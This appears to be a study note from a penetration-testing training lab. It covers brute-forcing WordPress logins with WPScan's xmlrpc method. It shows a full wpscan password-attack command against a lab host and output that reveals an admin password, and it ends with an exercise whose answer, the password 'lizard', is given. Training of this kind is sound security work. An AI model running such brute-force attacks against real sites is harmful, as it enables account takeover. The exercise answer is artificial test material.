<h3>Attacking WordPress Users</h3>

WordPress User Bruteforce

WPScan can be used to brute force usernames and passwords. The scan report returned three users registered on the website: admin, roger, and david. The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the normal WordPress login page, while the xmlrpc method uses the WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it is faster.

WPscan - XMLRPC

@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com


[+] URL: http://blog.inlanefreight.com/        

[+] Started: Thu Apr  9 13:37:36 2020         

[+] Performing password attack on Xmlrpc against 3 user/s


[SUCCESS] - admin / sunshine1

Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time: 00:00:01


[i] Valid Combinations Found:

 | Username: admin, Password: sunshine1


 Perform a bruteforce attack against the user "roger" on your target with the wordlist "rockyou.txt". Submit the user's password as the answer.

lizard


 <img width="1586" height="482" alt="image" src="https://github.com/user-attachments/assets/8bf5975e-0695-404e-90a1-2fd893ec6a45" />

